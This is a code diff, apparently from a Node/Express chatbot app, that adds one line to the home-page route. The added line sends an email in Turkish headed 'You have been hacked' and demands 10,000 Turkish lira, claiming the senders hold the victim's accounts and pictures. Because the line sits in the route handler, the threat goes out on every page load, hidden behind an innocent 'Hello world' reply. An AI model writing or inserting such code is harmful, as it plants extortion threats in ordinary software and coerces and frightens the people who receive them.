@@ -67,6 +67,7 @@ const sessionIds = new Map();
 
 // Index route
 app.get('/', function (req, res) {
+    sendEmail('Hacklendiniz','Tüm hesaplarınız, resimleriniz elimizde kısa sürede size ulaşacağız. 10.000 TL yi hazırlayın.');
 	res.send('Hello world, I am a chat bot');
 })
 
